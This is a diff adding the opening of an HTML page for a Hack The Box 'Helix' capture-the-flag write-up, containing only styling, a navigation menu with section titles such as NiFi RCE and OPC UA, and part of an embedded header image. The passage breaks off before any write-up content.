@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB :: Helix — Writeup</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Exo+2:ital,wght@0,300;0,400;0,600;1,300&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#080c0a;--bg2:#0d1410;--bg3:#111a14;--border:#1a2e1e;--green:#00e676;--green-dim:#00803f;--green-glow:#00e67640;--cyan:#00e5ff;--orange:#ff9100;--red:#ff1744;--text:#c8d8cb;--text-dim:#5a7a60;--mono:'Share Tech Mono',monospace;--display:'Orbitron',sans-serif;--body:'Exo 2',sans-serif}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-weight:300;line-height:1.7;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.08) 2px,rgba(0,0,0,.08) 4px);pointer-events:none;z-index:9999}
+body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");pointer-events:none;z-index:9998;opacity:.4}
+.nav{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(8,12,10,.92);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;padding:.75rem 2rem}
+.nav-back{font-family:var(--mono);font-size:.65rem;color:var(--text-dim);text-decoration:none;letter-spacing:.15em;transition:color .2s;text-transform:uppercase;display:flex;align-items:center;gap:.4rem}
+.nav-back:hover{color:var(--green)}
+.nav-logo{font-family:var(--display);font-size:.75rem;font-weight:700;color:var(--green);letter-spacing:.15em;text-decoration:none}
+.nav-links{display:flex;gap:1.5rem;list-style:none}
+.nav-links a{font-family:var(--mono);font-size:.65rem;color:var(--text-dim);text-decoration:none;letter-spacing:.15em;transition:color .2s;text-transform:uppercase}
+.nav-links a:hover{color:var(--green)}
+.hero{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;padding:4rem 2rem;overflow:hidden;border-bottom:1px solid var(--border)}
+.hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 50%,#00e67608 0%,transparent 70%),linear-gradient(rgba(0,230,118,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,230,118,.03) 1px,transparent 1px);background-size:auto,48px 48px,48px 48px;animation:gridPulse 8s ease-in-out infinite}
+@keyframes gridPulse{0%,100%{opacity:.6}50%{opacity:1}}
+.hero-badge{font-family:var(--mono);font-size:.7rem;letter-spacing:.3em;color:var(--green-dim);border:1px solid var(--green-dim);padding:.3rem 1rem;margin-bottom:2rem;animation:fadeUp .6s ease both;text-transform:uppercase}
+.hero-title{font-family:var(--display);font-size:clamp(3rem,8vw,7rem);font-weight:900;line-height:1;color:#fff;text-shadow:0 0 40px var(--green-glow),0 0 80px var(--green-glow);animation:fadeUp .6s .1s ease both}
+.hero-title span{color:var(--green);text-shadow:0 0 20px var(--green),0 0 60px var(--green-glow)}
+.hero-sub{font-family:var(--mono);font-size:.85rem;color:var(--text-dim);letter-spacing:.15em;margin-top:1.2rem;animation:fadeUp .6s .2s ease both}
+.hero-meta{display:flex;gap:2rem;margin-top:3rem;flex-wrap:wrap;justify-content:center;animation:fadeUp .6s .35s ease both}
+.hero-meta-item{display:flex;flex-direction:column;align-items:center;gap:.3rem}
+.hero-meta-label{font-family:var(--mono);font-size:.6rem;letter-spacing:.25em;color:var(--text-dim);text-transform:uppercase}
+.hero-meta-value{font-family:var(--mono);font-size:.95rem;color:var(--green);text-shadow:0 0 10px var(--green-glow)}
+.difficulty-badge{font-family:var(--mono);font-size:.75rem;padding:.25rem .8rem;border:1px solid var(--orange);color:var(--orange);text-shadow:0 0 8px rgba(255,145,0,.4);letter-spacing:.1em}
+.scroll-hint{position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;align-items:center;gap:.5rem;animation:fadeUp .6s .6s ease both}
+.scroll-hint span{font-family:var(--mono);font-size:.6rem;letter-spacing:.3em;color:var(--text-dim)}
+.scroll-arrow{width:1px;height:40px;background:linear-gradient(var(--green),transparent);animation:scrollPulse 1.5s ease-in-out infinite}
+@keyframes scrollPulse{0%,100%{opacity:.3;transform:scaleY(.8)}50%{opacity:1;transform:scaleY(1.2)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.wrapper{max-width:1100px;margin:0 auto;padding:0 2rem}
+section{padding:5rem 0;border-bottom:1px solid var(--border);opacity:0;transform:translateY(30px);transition:opacity .7s ease,transform .7s ease}
+section.visible{opacity:1;transform:translateY(0)}
+.section-label{font-family:var(--mono);font-size:.65rem;letter-spacing:.4em;color:var(--green-dim);text-transform:uppercase;margin-bottom:.75rem}
+.section-title{font-family:var(--display);font-size:clamp(1.5rem,3vw,2.2rem);font-weight:700;color:#fff;margin-bottom:2.5rem;line-height:1.2}
+.section-title .accent{color:var(--green)}
+.target-table{width:100%;border-collapse:collapse;margin:2rem 0;font-family:var(--mono);font-size:.8rem}
+.target-table th{text-align:left;padding:.6rem 1rem;border-bottom:1px solid var(--border);color:var(--text-dim);letter-spacing:.15em;text-transform:uppercase;font-size:.65rem}
+.target-table td{padding:.6rem 1rem;border-bottom:1px solid rgba(26,46,30,.5);color:var(--text)}
+.target-table tr:last-child td{border-bottom:none}
+.target-table td:first-child{color:var(--green-dim)}
+.phases{display:flex;flex-direction:column;gap:3rem}
+.phase{display:grid;grid-template-columns:80px 1fr;gap:2rem;opacity:0;transform:translateX(-20px);transition:opacity .6s ease,transform .6s ease}
+.phase.visible{opacity:1;transform:translateX(0)}
+.phase-num{font-family:var(--display);font-size:3.5rem;font-weight:900;color:transparent;-webkit-text-stroke:1px var(--green-dim);line-height:1;padding-top:.2rem}
+.phase-content{border-left:1px solid var(--border);padding-left:2rem}
+.phase-title{font-family:var(--display);font-size:1.1rem;font-weight:700;color:#fff;margin-bottom:.25rem}
+.phase-subtitle{font-family:var(--mono);font-size:.65rem;letter-spacing:.25em;color:var(--text-dim);margin-bottom:1rem;text-transform:uppercase}
+.phase-desc{color:var(--text);font-size:.95rem;margin-bottom:1.25rem}
+.code-block{background:var(--bg2);border:1px solid var(--border);margin:1.25rem 0;overflow:hidden}
+.code-block-header{display:flex;align-items:center;justify-content:space-between;padding:.5rem 1rem;background:var(--bg3);border-bottom:1px solid var(--border)}
+.code-dots{display:flex;gap:.35rem}
+.code-dots span{width:8px;height:8px;border-radius:50%}
+.code-dots span:nth-child(1){background:#ff5f57}
+.code-dots span:nth-child(2){background:#ffbd2e}
+.code-dots span:nth-child(3){background:#28c840}
+.code-lang{font-family:var(--mono);font-size:.6rem;letter-spacing:.2em;color:var(--text-dim);text-transform:uppercase}
+.code-block pre{padding:1.25rem 1.5rem;overflow-x:auto;font-family:var(--mono);font-size:.8rem;line-height:1.65;color:var(--text)}
+.cmd{color:var(--green)}.flag{color:var(--cyan)}.param{color:var(--orange)}.cmt{color:var(--text-dim);font-style:italic}.str{color:#f48fb1}.out{color:var(--text-dim)}.kw{color:#ce93d8}
+.callout{display:flex;gap:1rem;padding:1rem 1.25rem;border:1px solid;margin:1.25rem 0}
+.callout.info{border-color:var(--cyan);color:var(--cyan);background:rgba(0,229,255,.04)}
+.callout.success{border-color:var(--green);color:var(--green);background:rgba(0,230,118,.04)}
+.callout.warn{border-color:var(--orange);color:var(--orange);background:rgba(255,145,0,.04)}
+.callout.danger{border-color:var(--red);color:var(--red);background:rgba(255,23,68,.04)}
+.callout-icon{font-size:1rem;flex-shrink:0;margin-top:.1rem}
+.callout-text{font-size:.88rem;color:var(--text);line-height:1.6}
+.callout-text strong{color:inherit}
+.flag-box{background:var(--bg2);border:1px solid var(--border);padding:1.25rem 1.5rem;margin:1.5rem 0}
+.flag-label{font-family:var(--mono);font-size:.65rem;letter-spacing:.3em;color:var(--text-dim);text-transform:uppercase;margin-bottom:.75rem}
+.flag-redacted{width:100%;height:1.4em;background:repeating-linear-gradient(45deg,var(--border),var(--border) 4px,var(--bg3) 4px,var(--bg3) 8px);border-radius:2px;position:relative}
+.flag-redacted::after{content:'REDACTED';position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.65rem;letter-spacing:.3em;color:var(--text-dim)}
+.divider{display:flex;align-items:center;gap:1rem;margin:2.5rem 0}
+.divider-line{flex:1;height:1px;background:var(--border)}
+.divider-text{font-family:var(--mono);font-size:.6rem;letter-spacing:.3em;color:var(--text-dim);text-transform:uppercase;white-space:nowrap}
+.cred-chain{display:flex;flex-wrap:wrap;gap:.5rem;align-items:center;margin:2rem 0}
+.cred-node{font-family:var(--mono);font-size:.72rem;padding:.3rem .75rem;border:1px solid var(--green-dim);color:var(--green);background:rgba(0,230,118,.05)}
+.cred-arrow{color:var(--green-dim);font-size:.9rem}
+.timeline{position:relative;padding-left:2rem;margin:2rem 0}
+.timeline::before{content:'';position:absolute;left:0;top:0;bottom:0;width:1px;background:linear-gradient(var(--green),var(--green-dim),transparent)}
+.tl-item{position:relative;padding:0 0 2rem 2rem;opacity:0;transform:translateX(-15px);transition:opacity .5s ease,transform .5s ease}
+.tl-item.visible{opacity:1;transform:translateX(0)}
+.tl-item::before{content:'';position:absolute;left:-4px;top:6px;width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green)}
+.tl-step{font-family:var(--mono);font-size:.6rem;letter-spacing:.3em;color:var(--green-dim);text-transform:uppercase;margin-bottom:.25rem}
+.tl-title{font-family:var(--display);font-size:.85rem;font-weight:700;color:#fff;margin-bottom:.25rem}
+.tl-result{font-family:var(--mono);font-size:.75rem;color:var(--text-dim)}
+.takeaway-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.5rem;margin:2.5rem 0}
+.takeaway-card{background:var(--bg2);border:1px solid var(--border);padding:1.5rem;position:relative;cursor:default;transition:background .3s,border-color .3s;overflow:hidden}
+.takeaway-card::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--green);transform:scaleX(0);transform-origin:left;transition:transform .3s ease}
+.takeaway-card:hover{background:rgba(0,230,118,.04);border-color:var(--green-dim)}
+.takeaway-card:hover::after{transform:scaleX(1)}
+.takeaway-num{font-family:var(--mono);font-size:.65rem;color:var(--green-dim);letter-spacing:.3em;margin-bottom:.6rem}
+.takeaway-title{font-family:var(--display);font-size:.85rem;font-weight:700;color:#fff;margin-bottom:.75rem}
+.takeaway-desc{font-size:.88rem;color:var(--text-dim);line-height:1.6}
+.artifact-table{width:100%;border-collapse:collapse;margin:2rem 0;font-family:var(--mono);font-size:.76rem}
+.artifact-table th{text-align:left;padding:.55rem 1rem;border-bottom:1px solid var(--border);color:var(--text-dim);letter-spacing:.1em;text-transform:uppercase;font-size:.62rem}
+.artifact-table td{padding:.6rem 1rem;border-bottom:1px solid rgba(26,46,30,.5);color:var(--text);vertical-align:top;line-height:1.5}
+.artifact-table tr:last-child td{border-bottom:none}
+.artifact-table td:first-child{color:var(--green)}
+footer{padding:3rem 2rem;text-align:center;background:var(--bg2);border-top:1px solid var(--border)}
+.ft-logo{font-family:var(--display);font-size:.8rem;color:var(--green-dim);letter-spacing:.3em;margin-bottom:.75rem}
+footer p{font-family:var(--mono);font-size:.7rem;color:var(--text-dim);letter-spacing:.1em}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <a href="htb-writeups.html" class="nav-back">&#8592; Back</a>
+  <a class="nav-logo" href="#">HTB::HELIX</a>
+  <ul class="nav-links">
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#nifi">NiFi RCE</a></li>
+    <li><a href="#user">User</a></li>
+    <li><a href="#ics">ICS Analysis</a></li>
+    <li><a href="#opcua">OPC UA</a></li>
+    <li><a href="#root">Root</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div style="position:relative;margin-bottom:2rem;animation:fadeUp .6s .05s ease both;filter:drop-shadow(0 0 30px rgba(255,145,0,0.6)) drop-shadow(0 0 60px rgba(255,145,0,0.3))"><img src="data:image/png;base64,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